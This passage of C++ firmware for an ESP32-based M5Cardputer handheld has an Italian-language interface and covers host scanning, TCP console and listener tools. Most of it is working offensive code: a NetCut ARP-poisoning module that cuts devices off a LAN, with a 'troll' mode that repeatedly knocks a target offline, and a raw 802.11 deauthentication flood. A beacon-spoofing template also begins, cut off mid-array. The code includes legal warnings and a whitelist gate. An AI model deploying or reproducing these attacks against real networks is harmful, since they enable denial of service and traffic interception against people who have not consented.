        last = (own & 0xFFFFFF00u) | 254;
    }

    std::vector<HostEntry> hosts;
    hosts.reserve(256);
    uint32_t scanned = 0;
    const uint32_t total = last >= first ? last - first + 1 : 0;
    uint32_t lastDraw = 0;

    navigation::waitRelease();
    for (uint32_t value = first; value <= last; ++value) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        if (value == own) {
            continue;
        }
        ip4_addr_t target;
        target.addr = htonl(value);
        LOCK_TCPIP_CORE();
        etharp_request(netif, &target);
        UNLOCK_TCPIP_CORE();
        ++scanned;

        if ((scanned % 8) == 0) {
            LOCK_TCPIP_CORE();
            readArpHosts(netif, hosts);
            UNLOCK_TCPIP_CORE();
        }

        const uint32_t now = millis();
        if (now - lastDraw > 250) {
            display::clear();
            display::header("Scan Hosts", "WiFi");
            display::textCentered(40, "Scansione ARP", display::kAccent, 2);
            textCenteredFormat(64, display::kText, 0, "%u / %u host",
                               static_cast<unsigned>(scanned),
                               static_cast<unsigned>(total));
            display::progressBar(20, 84, 200, 8,
                                 total == 0 ? 0.0f
                                            : static_cast<float>(scanned) /
                                                  static_cast<float>(total),
                                 display::kInfo);
            textCenteredFormat(104, display::kTextDim, 0, "Trovati: %u",
                               static_cast<unsigned>(hosts.size()));
            display::footer("ESC = interrompi");
            display::push();
            lastDraw = now;
        }
        delay(12);
    }

    LOCK_TCPIP_CORE();
    readArpHosts(netif, hosts);
    UNLOCK_TCPIP_CORE();

    if (hosts.empty()) {
        ui::message("Scan Hosts", {"Nessun host trovato."}, "WiFi");
        return;
    }

    std::vector<std::string> labels;
    labels.reserve(hosts.size());
    for (const auto& host : hosts) {
        labels.push_back(std::string(host.ip.toString().c_str()) + "  " +
                         hostMac(host.mac) +
                         (host.ip == gatewayIp ? "  GTW" : ""));
    }
    const int choice = chooseIndex("Host trovati", "WiFi", labels,
                                   "ENTER=port scan  `=indietro");
    if (choice >= 0 && choice < static_cast<int>(hosts.size())) {
        runPortScan(hosts[static_cast<size_t>(choice)]);
    }
}

void runTcpConsole(const std::string& title, uint16_t defaultPort) {
    std::vector<textinput::Field> fields;
    textinput::Field hostField;
    hostField.label = "Host / IP";
    hostField.maxLen = 32;
    textinput::Field portField;
    portField.label = "Porta";
    portField.value = std::to_string(defaultPort);
    portField.maxLen = 5;
    portField.numeric = true;
    fields.push_back(hostField);
    fields.push_back(portField);

    if (!textinput::edit(title, "WiFi", fields)) {
        return;
    }
    long port = 0;
    if (fields[0].value.empty() ||
        !textinput::parseInt(fields[1].value, port) || port <= 0 ||
        port > 65535) {
        ui::message(title, {"Host o porta non validi."}, "WiFi");
        return;
    }

    if (!wifisetup::ensureConnected(true, "WiFi")) {
        ui::message(title,
                    {"WiFi non connesso.", "Configura la rete da",
                     "Impostazioni > Rete WiFi."},
                    "WiFi");
        return;
    }

    WiFiClient client;
    client.setTimeout(3000);
    if (!client.connect(fields[0].value.c_str(),
                        static_cast<uint16_t>(port))) {
        ui::message(title, {"Connessione non riuscita.", fields[0].value + ":" +
                                                         fields[1].value},
                    "WiFi");
        return;
    }

    std::string lines[7];
    std::string current;
    int lineCount = 0;
    uint32_t lastDraw = 0;

    navigation::waitRelease();
    // In console i caratteri si leggono diretti da keysState(): navigation::poll()
    // trasforma ; . , / in frecce e quei caratteri non arriverebbero mai.
    std::vector<char> lastWord = M5Cardputer.Keyboard.keysState().word;
    while (true) {
        navigation::update();
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }
        if (ev.type == navigation::Event::Select) {
            client.write('\r');
        }
        auto& state = M5Cardputer.Keyboard.keysState();
        for (char c : state.word) {
            if (c < 0x20 || c >= 0x7F || c == '`') {
                continue;
            }
            if (std::find(lastWord.begin(), lastWord.end(), c) !=
                lastWord.end()) {
                continue;
            }
            client.write(static_cast<uint8_t>(c));
        }
        lastWord.assign(state.word.begin(), state.word.end());

        while (client.available()) {
            const int value = client.read();
            if (value == '\r') {
                continue;
            }
            if (value == '\n') {
                for (int i = 0; i < 6; ++i) {
                    lines[i] = lines[i + 1];
                }
                lines[6] = current;
                current.clear();
                if (lineCount < 7) {
                    ++lineCount;
                }
            } else if (value >= 32 && value < 127 && current.size() < 38) {
                current.push_back(static_cast<char>(value));
            }
        }

        const uint32_t now = millis();
        if (now - lastDraw > 100) {
            display::clear();
            display::header(title, "WiFi");
            textFormat(6, 22, display::kTextDim, 0, "%s:%ld%s",
                       fields[0].value.c_str(), port,
                       client.connected() ? "" : "  [chiuso]");
            for (int i = 0; i < 7; ++i) {
                display::text(6, 36 + i * 11, lines[i], display::kText, 0);
            }
            textFormat(6, 117, display::kAccent, 0, "> %s", current.c_str());
            display::footer("scrivi + INVIO   ESC = esci");
            display::push();
            lastDraw = now;
        }
        delay(10);
    }

    client.stop();
    navigation::waitRelease();  // scarta i caratteri rimasti nella coda di poll()
}

void runTcpListener() {
    if (!wifisetup::ensureConnected(true, "WiFi")) {
        ui::message("TCP Listener",
                    {"WiFi non connesso.", "Configura la rete da",
                     "Impostazioni > Rete WiFi."},
                    "WiFi");
        return;
    }
    textinput::Field portField;
    portField.label = "Porta";
    portField.value = "2323";
    portField.maxLen = 5;
    portField.numeric = true;
    std::vector<textinput::Field> fields;
    fields.push_back(portField);

    if (!textinput::edit("TCP Listener", "WiFi", fields)) {
        return;
    }
    long port = 0;
    if (!textinput::parseInt(fields[0].value, port) || port <= 0 ||
        port > 65535) {
        ui::message("TCP Listener", {"Porta non valida."}, "WiFi");
        return;
    }

    WiFiServer server(static_cast<uint16_t>(port));
    server.begin();
    WiFiClient client;
    std::string buffer;
    std::string lineRing[5];
    std::string currentLine;
    size_t lineTotal = 0;
    uint32_t lastDraw = 0;

    navigation::waitRelease();
    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        if (!client || !client.connected()) {
            WiFiClient incoming = server.available();
            if (incoming) {
                client = incoming;
                buffer.clear();
            }
        }
        while (client && client.available()) {
            const int value = client.read();
            if (value >= 32 && value < 127) {
                buffer.push_back(static_cast<char>(value));
                if (buffer.size() > 220) {
                    buffer.erase(0, buffer.size() - 220);
                }
            } else if (value == '\n' || value == '\r') {
                buffer.push_back('\n');
            }
        }

        const uint32_t now = millis();
        if (now - lastDraw > 150) {
            display::clear();
            display::header("TCP Listener", "WiFi");
            textFormat(8, 26, display::kAccent, 0, "IP: %s:%u",
                       WiFi.localIP().toString().c_str(),
                       static_cast<unsigned>(port));
            display::text(8, 42,
                          client && client.connected() ? "Client connesso"
                                                       : "In ascolto...",
                          display::kText, 0);
            // Ring di 5 righe riusate: nessun vector ricreato a ogni frame.
            lineTotal = 0;
            currentLine.clear();
            for (char c : buffer) {
                if (c == '\n') {
                    lineRing[lineTotal % 5] = currentLine;
                    ++lineTotal;
                    currentLine.clear();
                } else {
                    currentLine.push_back(c);
                }
            }
            if (!currentLine.empty()) {
                lineRing[lineTotal % 5] = currentLine;
                ++lineTotal;
            }
            const size_t shown = lineTotal < 5 ? lineTotal : 5;
            size_t first = lineTotal > shown ? lineTotal - shown : 0;
            for (size_t i = 0; i < shown; ++i) {
                display::text(8, 64 + static_cast<int>(i) * 11,
                              lineRing[(first + i) % 5], display::kText, 0);
            }
            display::footer("ESC = interrompi");
            display::push();
            lastDraw = now;
        }
        delay(20);
    }

    if (client) {
        client.stop();
    }
    server.end();
}

#if ENABLE_OFFENSIVE
void networkLabels(const std::vector<Network>& networks,
                   std::vector<std::string>& labels) {
    labels.clear();
    labels.reserve(networks.size());
    for (const auto& network : networks) {
        labels.push_back(shortened(network.ssid, 18) + "  ch" +
                         std::to_string(network.channel) + "  " +
                         std::to_string(network.rssi) + "dBm");
    }
}

bool parseBssid(const std::string& text, uint8_t out[6]) {
    int values[6] = {0};
    if (sscanf(text.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1],
               &values[2], &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; ++i) {
        if (values[i] < 0 || values[i] > 255) {
            return false;
        }
        out[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
}

void drawDeauth(const Network& network, uint32_t packets, uint32_t txFail,
                uint32_t remainingMs) {
    display::clear();
    display::header("Deauth WiFi", "WiFi");
    display::text(8, 30, "Target:", display::kTextDim, 0);
    static std::string name;
    display::text(8, 42, shortenInto(name, network.ssid, 28), display::kAccent, 2);
    textFormat(8, 64, display::kText, 0, "BSSID %s", network.bssid.c_str());
    textFormat(8, 76, display::kText, 0, "Canale %d", network.channel);
    if (txFail) {
        textFormat(120, 76, display::kWarning, 0, "OK %u  KO %u",
                   static_cast<unsigned>(packets), static_cast<unsigned>(txFail));
    } else {
        textFormat(120, 76, display::kText, 0, "OK %u",
                   static_cast<unsigned>(packets));
    }
    display::progressBar(8, 92, 180, 8,
                         1.0f - static_cast<float>(remainingMs) / 60000.0f,
                         display::kDanger);
    display::text(8, 106, "Solo reti proprie / autorizzate", display::kWarning, 0);
    display::footer("ESC = interrompi (max 60s)");
    display::push();
}

constexpr int kNetCutMaxDevices = 64;
constexpr uint32_t kNetCutIntervalMs = 1000;
constexpr uint32_t kNetCutTrollOfflineMs = 10000;
constexpr uint32_t kNetCutTrollOnlineMs = 5000;

struct NetCutDevice {
    IPAddress ip;
    uint8_t mac[6] = {0};
    char macStr[18] = {0};
    bool isVip = false;
    bool isCut = false;
};

std::vector<NetCutDevice> g_netCutDevices;
std::vector<std::string> g_netCutVips;
uint8_t g_netCutMyMac[6] = {0};
uint8_t g_netCutGwMac[6] = {0};
bool g_netCutGwMacValid = false;
ip4_addr_t g_netCutGwIp = {0};

struct netif* netcutStaNetif() {
    esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta) {
        return nullptr;
    }
    return static_cast<struct netif*>(esp_netif_get_netif_impl(sta));
}

void netcutSendArp(const uint8_t* ethDst, const uint8_t* senderMac,
                   const uint8_t* senderIp, const uint8_t* targetMac,
                   const uint8_t* targetIp, uint16_t opcode, int repeat) {
    struct netif* iface = netcutStaNetif();
    if (!iface) {
        return;
    }
    struct pbuf* p = pbuf_alloc(
        PBUF_RAW, SIZEOF_ETH_HDR + sizeof(struct etharp_hdr), PBUF_RAM);
    if (!p) {
        return;
    }
    auto* eth = static_cast<struct eth_hdr*>(p->payload);
    auto* arp = reinterpret_cast<struct etharp_hdr*>(
        static_cast<uint8_t*>(p->payload) + SIZEOF_ETH_HDR);

    memcpy(&eth->dest, ethDst, ETH_HWADDR_LEN);
    memcpy(&eth->src, g_netCutMyMac, ETH_HWADDR_LEN);
    eth->type = PP_HTONS(ETHTYPE_ARP);

    arp->hwtype = PP_HTONS(1);
    arp->proto = PP_HTONS(ETHTYPE_IP);
    arp->hwlen = ETH_HWADDR_LEN;
    arp->protolen = sizeof(ip4_addr_t);
    arp->opcode = PP_HTONS(opcode);
    memcpy(&arp->shwaddr, senderMac, ETH_HWADDR_LEN);
    memcpy(&arp->sipaddr, senderIp, sizeof(ip4_addr_t));
    memcpy(&arp->dhwaddr, targetMac, ETH_HWADDR_LEN);
    memcpy(&arp->dipaddr, targetIp, sizeof(ip4_addr_t));

    for (int i = 0; i < repeat; ++i) {
        esp_wifi_internal_tx(WIFI_IF_STA, p->payload, p->tot_len);
        if (repeat > 1) {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
    }
    pbuf_free(p);
}

void netcutLoadVips() {
    g_netCutVips.clear();
    std::string text;
    if (!storage::readText("/netcut_vip.txt", text, 4096, false)) {
        return;
    }
    std::string line;
    for (char c : text) {
        if (c == '\n' || c == '\r') {
            if (!line.empty()) {
                g_netCutVips.push_back(line);
                line.clear();
            }
        } else {
            line.push_back(c);
        }
    }
    if (!line.empty()) {
        g_netCutVips.push_back(line);
    }
}

void netcutSaveVips() {
    std::string text;
    for (const std::string& mac : g_netCutVips) {
        text += mac + "\n";
    }
    storage::writeText("/netcut_vip.txt", text, false);
}

void netcutReadArpTable() {
    struct netif* iface = netcutStaNetif();
    if (!iface) {
        return;
    }
    for (uint32_t i = 0; i < ARP_TABLE_SIZE; ++i) {
        ip4_addr_t* ipRet = nullptr;
        eth_addr* ethRet = nullptr;
        struct netif* tmp = nullptr;
        if (!etharp_get_entry(i, &ipRet, &tmp, &ethRet) || !ipRet || !ethRet) {
            continue;
        }
        if (ipRet->addr == g_netCutGwIp.addr) {
            if (!g_netCutGwMacValid) {
                memcpy(g_netCutGwMac, ethRet->addr, 6);
                g_netCutGwMacValid = true;
            }
            continue;
        }
        bool allZero = true;
        bool allFf = true;
        for (int b = 0; b < 6; ++b) {
            if (ethRet->addr[b] != 0x00) {
                allZero = false;
            }
            if (ethRet->addr[b] != 0xFF) {
                allFf = false;
            }
        }
        if (allZero || allFf) {
            continue;
        }
        char mac[18];
        hostMacInto(mac, ethRet->addr);
        bool found = false;
        for (NetCutDevice& dev : g_netCutDevices) {
            if (std::strcmp(dev.macStr, mac) == 0) {
                dev.ip = IPAddress(ipRet->addr);
                found = true;
                break;
            }
        }
        if (found || static_cast<int>(g_netCutDevices.size()) >=
                         kNetCutMaxDevices) {
            continue;
        }
        NetCutDevice dev;
        dev.ip = IPAddress(ipRet->addr);
        memcpy(dev.mac, ethRet->addr, 6);
        hostMacInto(dev.macStr, dev.mac);
        for (const std::string& vip : g_netCutVips) {
            if (vip == dev.macStr) {
                dev.isVip = true;
                break;
            }
        }
        g_netCutDevices.push_back(dev);
    }
}

int netcutScan() {
    if (WiFi.status() != WL_CONNECTED) {
        return 0;
    }
    struct netif* iface = netcutStaNetif();
    esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!iface || !sta) {
        return 0;
    }
    esp_netif_ip_info_t info = {};
    if (esp_netif_get_ip_info(sta, &info) != ESP_OK) {
        return 0;
    }
    g_netCutGwIp.addr = info.gw.addr;
    esp_wifi_get_mac(WIFI_IF_STA, g_netCutMyMac);

    g_netCutDevices.clear();
    g_netCutGwMacValid = false;
    netcutLoadVips();

    const uint32_t own = ntohl(info.ip.addr);
    uint32_t mask = ntohl(info.netmask.addr);
    if (mask == 0) {
        mask = 0xFFFFFF00UL;
    }
    uint32_t network = ntohl(info.gw.addr) & mask;
    uint32_t broadcast = network | ~mask;
    if (broadcast > network && broadcast - network > 512) {
        network = own & 0xFFFFFF00UL;
        broadcast = network | 0xFFUL;
    }
    if (broadcast <= network) {
        return 0;
    }
    const uint32_t totalHosts = broadcast - network - 1;
    uint32_t scanned = 0;
    uint32_t lastTableRead = 0;
    uint32_t lastDraw = 0;

    navigation::waitRelease();
    LOCK_TCPIP_CORE();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    for (uint32_t value = network + 1; value < broadcast; ++value) {
        if (value == own) {
            continue;
        }
        ip4_addr_t target = {};
        target.addr = htonl(value);
        LOCK_TCPIP_CORE();
        etharp_request(iface, &target);
        UNLOCK_TCPIP_CORE();
        ++scanned;

        if (scanned - lastTableRead >= ARP_TABLE_SIZE) {
            LOCK_TCPIP_CORE();
            netcutReadArpTable();
            UNLOCK_TCPIP_CORE();
            lastTableRead = scanned;
        }
        vTaskDelay(pdMS_TO_TICKS(15));

        const uint32_t now = millis();
        if (now - lastDraw > 200) {
            navigation::update();
            if (navigation::poll().type == navigation::Event::Back) {
                break;
            }
            display::clear();
            display::header("NetCut Scan", "WiFi");
            textFormat(8, 30, display::kText, 0, "SSID: %s",
                       WiFi.SSID().c_str());
            textFormat(8, 46, display::kText, 0, "GW: %s",
                       IPAddress(info.gw.addr).toString().c_str());
            textFormat(8, 64, display::kAccent, 0, "%u/%u  trovati: %u",
                       static_cast<unsigned>(scanned),
                       static_cast<unsigned>(totalHosts),
                       static_cast<unsigned>(g_netCutDevices.size()));
            display::progressBar(
                8, 82, 200, 8,
                totalHosts == 0 ? 1.0f
                                : static_cast<float>(scanned) /
                                      static_cast<float>(totalHosts),
                display::kInfo);
            display::footer("ESC = annulla");
            display::push();
            lastDraw = now;
        }
    }

    LOCK_TCPIP_CORE();
    netcutReadArpTable();
    etharp_cleanup_netif(iface);
    UNLOCK_TCPIP_CORE();

    if (!g_netCutGwMacValid) {
        wifi_ap_record_t ap = {};
        if (esp_wifi_sta_get_ap_info(&ap) == ESP_OK) {
            memcpy(g_netCutGwMac, ap.bssid, 6);
            g_netCutGwMacValid = true;
        }
    }
    return static_cast<int>(g_netCutDevices.size());
}

void netcutPoisonDevice(int idx, int burst) {
    if (idx < 0 || idx >= static_cast<int>(g_netCutDevices.size()) ||
        !g_netCutGwMacValid) {
        return;
    }
    NetCutDevice& dev = g_netCutDevices[idx];
    if (dev.isVip) {
        return;
    }
    uint8_t devIp[4];
    uint8_t gwIp[4];
    const uint32_t dip = static_cast<uint32_t>(dev.ip);
    const uint32_t gw = g_netCutGwIp.addr;
    memcpy(devIp, &dip, 4);
    memcpy(gwIp, &gw, 4);

    netcutSendArp(dev.mac, g_netCutMyMac, gwIp, dev.mac, devIp, ARP_REPLY,
                  burst);
    netcutSendArp(g_netCutGwMac, g_netCutMyMac, devIp, g_netCutGwMac, gwIp,
                  ARP_REPLY, burst);
    dev.isCut = true;
}

void netcutRestoreDevice(int idx) {
    if (idx < 0 || idx >= static_cast<int>(g_netCutDevices.size()) ||
        !g_netCutGwMacValid) {
        return;
    }
    NetCutDevice& dev = g_netCutDevices[idx];
    uint8_t devIp[4];
    uint8_t gwIp[4];
    const uint32_t dip = static_cast<uint32_t>(dev.ip);
    const uint32_t gw = g_netCutGwIp.addr;
    memcpy(devIp, &dip, 4);
    memcpy(gwIp, &gw, 4);
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    for (int round = 0; round < 3; ++round) {
        netcutSendArp(dev.mac, g_netCutGwMac, gwIp, dev.mac, devIp, ARP_REPLY,
                      5);
        netcutSendArp(broadcast, g_netCutGwMac, gwIp, broadcast, devIp,
                      ARP_REQUEST, 5);
        netcutSendArp(g_netCutGwMac, dev.mac, devIp, g_netCutGwMac, gwIp,
                      ARP_REPLY, 5);
        netcutSendArp(broadcast, dev.mac, devIp, broadcast, gwIp, ARP_REQUEST,
                      5);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    dev.isCut = false;
}

void netcutRestoreAll() {
    for (int i = 0; i < static_cast<int>(g_netCutDevices.size()); ++i) {
        if (g_netCutDevices[i].isCut) {
            netcutRestoreDevice(i);
        }
    }
}

void netcutCutAll() {
    for (int i = 0; i < static_cast<int>(g_netCutDevices.size()); ++i) {
        if (!g_netCutDevices[i].isVip) {
            netcutPoisonDevice(i, 20);
        }
    }
}

void netcutActiveAll() {
    uint32_t last = 0;
    uint32_t lastDraw = 0;
    navigation::waitRelease();
    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        if (now - last >= kNetCutIntervalMs) {
            for (int i = 0; i < static_cast<int>(g_netCutDevices.size()); ++i) {
                if (!g_netCutDevices[i].isVip) {
                    netcutPoisonDevice(i, 1);
                }
            }
            last = now;
        }
        if (now - lastDraw > 250) {
            display::clear();
            display::header("NetCut attivo", "WiFi");
            display::textCentered(44, "ARP poisoning in corso",
                                  display::kDanger, 2);
            textCenteredFormat(66, display::kText, 0, "Dispositivi: %u",
                               static_cast<unsigned>(g_netCutDevices.size()));
            display::textCentered(82, "` = termina e ripristina",
                                  display::kWarning, 0);
            display::footer("Solo reti autorizzate");
            display::push();
            lastDraw = now;
        }
        delay(30);
    }
    netcutRestoreAll();
}

void netcutActiveSingle(int idx) {
    uint32_t last = 0;
    uint32_t lastDraw = 0;
    navigation::waitRelease();
    netcutPoisonDevice(idx, 20);
    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        if (now - last >= kNetCutIntervalMs) {
            netcutPoisonDevice(idx, 1);
            last = now;
        }
        if (now - lastDraw > 250) {
            display::clear();
            display::header("NetCut", "WiFi");
            textFormat(8, 34, display::kAccent, 2, "%s",
                       g_netCutDevices[idx].ip.toString().c_str());
            display::text(8, 58, g_netCutDevices[idx].macStr,
                          display::kText, 0);
            display::text(8, 82, "` = termina e ripristina",
                          display::kWarning, 0);
            display::footer("Solo reti autorizzate");
            display::push();
            lastDraw = now;
        }
        delay(30);
    }
    netcutRestoreDevice(idx);
}

void netcutTroll(int idx) {
    bool offline = true;
    uint32_t phaseStart = millis();
    uint32_t lastSend = 0;
    uint32_t lastDraw = 0;
    navigation::waitRelease();
    while (true) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        const uint32_t phaseMs =
            offline ? kNetCutTrollOfflineMs : kNetCutTrollOnlineMs;
        if (now - phaseStart >= phaseMs) {
            offline = !offline;
            phaseStart = now;
        }
        if (now - lastSend >= 500) {
            if (offline) {
                netcutPoisonDevice(idx, 1);
            } else {
                netcutRestoreDevice(idx);
            }
            lastSend = now;
        }
        if (now - lastDraw > 250) {
            display::clear();
            display::header("NetCut Troll", "WiFi");
            textFormat(8, 34, display::kAccent, 2, "%s",
                       g_netCutDevices[idx].ip.toString().c_str());
            display::text(8, 58, offline ? "OFFLINE" : "ONLINE",
                          offline ? display::kDanger : display::kInfo, 2);
            display::text(8, 82, "` = termina e ripristina",
                          display::kWarning, 0);
            display::footer("Solo reti autorizzate");
            display::push();
            lastDraw = now;
        }
        delay(30);
    }
    netcutRestoreDevice(idx);
}

void netcutToggleVip(int idx) {
    if (idx < 0 || idx >= static_cast<int>(g_netCutDevices.size())) {
        return;
    }
    NetCutDevice& dev = g_netCutDevices[idx];
    dev.isVip = !dev.isVip;
    const auto it = std::find(g_netCutVips.begin(), g_netCutVips.end(),
                              std::string(dev.macStr));
    if (dev.isVip) {
        if (it == g_netCutVips.end()) {
            g_netCutVips.push_back(dev.macStr);
        }
        if (dev.isCut) {
            netcutRestoreDevice(idx);
        }
    } else if (it != g_netCutVips.end()) {
        g_netCutVips.erase(it);
    }
    netcutSaveVips();
}

void netcutDeviceMenu(int idx) {
    while (true) {
        NetCutDevice& dev = g_netCutDevices[idx];
        std::vector<std::string> labels = {
            dev.isVip ? "Rimuovi VIP" : "Segna VIP",
            "Cut (blocca)",
            "Troll on/off",
            "Ripristina",
            "Indietro",
        };
        const int choice = chooseIndex(
            std::string(dev.ip.toString().c_str()) + " " + dev.macStr,
            "NetCut", labels, "INVIO=azione  `=indietro");
        if (choice < 0 || choice == 4) {
            return;
        }
        switch (choice) {
            case 0:
                netcutToggleVip(idx);
                break;
            case 1:
                netcutActiveSingle(idx);
                break;
            case 2:
                netcutTroll(idx);
                break;
            case 3:
                netcutRestoreDevice(idx);
                break;
            default:
                break;
        }
    }
}

void runNetCut() {
    if (!wifisetup::ensureConnected(true, "WiFi")) {
        ui::message("NetCut",
                    {"Connettiti prima a una rete WiFi.",
                     "Serve un IP assegnato dal router."},
                    "WiFi");
        return;
    }
    if (WiFi.status() != WL_CONNECTED) {
        ui::message("NetCut",
                    {"Connettiti prima a una rete WiFi.",
                     "Serve un IP assegnato dal router."},
                    "WiFi");
        return;
    }
    if (!ui::legalWarning(
            "NetCut / ARP spoof",
            {"Invia risposte ARP false per interrompere il traffico.",
             "Puo' isolare dispositivi e interrompere la rete.",
             "Solo su reti tue o con autorizzazione scritta."},
            "WiFi")) {
        return;
    }

    WiFi.setSleep(false);
    if (netcutScan() == 0) {
        ui::message("NetCut", {"Nessun dispositivo trovato.",
                               "Verifica la connessione WiFi."},
                    "WiFi");
        return;
    }

    while (true) {
        std::vector<std::string> labels = {
            "Cut all",
            "Resume all",
            "Device list",
            "Exit",
        };
        const int choice =
            chooseIndex("NetCut", "WiFi", labels,
                        "INVIO=seleziona  `=indietro  " +
                            std::to_string(g_netCutDevices.size()) +
                            " dispositivi");
        if (choice < 0 || choice == 3) {
            break;
        }
        if (choice == 0) {
            netcutCutAll();
            netcutActiveAll();
        } else if (choice == 1) {
            netcutRestoreAll();
        } else if (choice == 2) {
            std::vector<std::string> devices;
            devices.reserve(g_netCutDevices.size());
            for (const NetCutDevice& dev : g_netCutDevices) {
                devices.push_back(std::string(dev.ip.toString().c_str()) +
                                  "  " + dev.macStr +
                                  (dev.isVip ? "  VIP" : "") +
                                  (dev.isCut ? "  CUT" : ""));
            }
            const int index =
                chooseIndex("Dispositivi", "NetCut", devices,
                            "INVIO=dettagli  `=indietro");
            if (index >= 0) {
                netcutDeviceMenu(index);
            }
        }
    }
    netcutRestoreAll();
}

// Whitelist condivisa: gli attacchi del menu WiFi la usano come WiFi Lab.
// Fail-closed: senza file valido non parte alcuna trasmissione.
bool whitelistReadyOrBlock(const char* parent) {
    netguard::reload();
    if (netguard::ready()) {
        return true;
    }
    ui::message("Whitelist",
                {"!Whitelist assente o non valida.", "Attacco bloccato.",
                 "Crea /wifilab/whitelist.txt", "da WiFi Lab > Whitelist."},
                parent);
    return false;
}

uint8_t ssidLength(const std::string& ssid) {
    return static_cast<uint8_t>(std::min<size_t>(ssid.size(), 32));
}

bool networkProtected(const Network& network) {
    uint8_t bssid[6];
    const bool valid = parseBssid(network.bssid, bssid);
    return netguard::isProtected(valid ? bssid : nullptr, network.ssid.c_str(),
                                 ssidLength(network.ssid));
}

// Gate comune per Evil Twin/Evil Portal: niente avvio se la rete e' protetta.
bool blockIfWhitelisted(const Network& network, const char* title) {
    if (!whitelistReadyOrBlock("WiFi")) {
        return true;
    }
    if (!networkProtected(network)) {
        return false;
    }
    ui::message(title, {"Rete in whitelist.", "Attacco bloccato."}, "WiFi");
    return true;
}

void runDeauth() {
    if (!collectNetworks(g_networks) || g_networks.empty()) {
        return;
    }
    std::vector<std::string> labels;
    networkLabels(g_networks, labels);
    const int choice = chooseIndex("Target deauth", "WiFi", labels,
                                   "ENTER=seleziona  `=indietro");
    if (choice < 0) {
        return;
    }
    const Network target = g_networks[choice];

    if (!whitelistReadyOrBlock("WiFi")) {
        return;
    }
    uint8_t bssid[6] = {0};
    if (!parseBssid(target.bssid, bssid)) {
        ui::message("Deauth", {"BSSID non valido."}, "WiFi");
        return;
    }
    if (networkProtected(target)) {
        ui::message("Deauth", {"Rete in whitelist.", "Attacco bloccato."}, "WiFi");
        return;
    }

    if (!ui::legalWarning("Deauth WiFi",
                          {"Invia frame 802.11 di disconnessione.",
                           "Puo' interrompere reti e dispositivi vicini.",
                           "Solo su reti tue o con autorizzazione scritta."},
                          "WiFi")) {
        return;
    }

    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(150);

    const esp_err_t promiscuous = esp_wifi_set_promiscuous(true);
    if (promiscuous != ESP_OK) {
        WiFi.mode(WIFI_OFF);
        ui::message("Deauth", {"Impossibile attivare la modalita' promiscua."},
                    "WiFi");
        return;
    }
    esp_wifi_set_channel(static_cast<uint8_t>(std::max(1, target.channel)),
                         WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00,
        0x07, 0x00,
    };

    constexpr uint32_t kMaxDuration = 60000;
    const uint32_t start = millis();
    uint32_t packets = 0;
    uint32_t txFail = 0;
    uint32_t failRun = 0;
    bool blockedWarned = false;
    uint32_t lastDraw = 0;
    uint32_t sequence = 0;

    navigation::waitRelease();
    while (millis() - start < kMaxDuration) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        for (int i = 0; i < 5; ++i) {
            frame[22] = static_cast<uint8_t>(sequence & 0xFF);
            frame[23] = static_cast<uint8_t>(((sequence >> 8) & 0x0F) << 4);
            ++sequence;
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) ==
                ESP_OK) {
                ++packets;
                failRun = 0;
            } else {
                ++txFail;
                // Blocco prolungato: il driver rifiuta tutto (canale/regione).
                if (++failRun >= 10 && !blockedWarned) {
                    blockedWarned = true;
                    ui::message("Deauth",
                                {"!TX 802.11 rifiutato dal driver.",
                                 "I frame non partono: canale o", "regione non consentiti."},
                                "WiFi");
                }
            }
            delay(4);
        }
        const uint32_t now = millis();
        if (now - lastDraw > 120) {
            drawDeauth(target, packets, txFail, kMaxDuration - (now - start));
            lastDraw = now;
        }
    }

    stopPromiscuous();
    // Punti mascotte solo se almeno un frame e' partito.
    if (packets > 0) {
        mascot::award(mascot::Event::WifiDeauth);
    }
    logger::info("Deauth terminato: %u frame", static_cast<unsigned>(packets));
}

// Adattato da Bruce (AGPL-3.0), src/modules/wifi/wifi_atks.cpp.
constexpr size_t kBeaconLen = 109;
const uint8_t kBeaconTemplate[kBeaconLen] = {
    0x80, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x00, 0x00,
    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,
    0xE8, 0x03,
    0x31, 0x00,
    0x00, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x01, 0x08,
    0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    0x03, 0x01, 0x01,
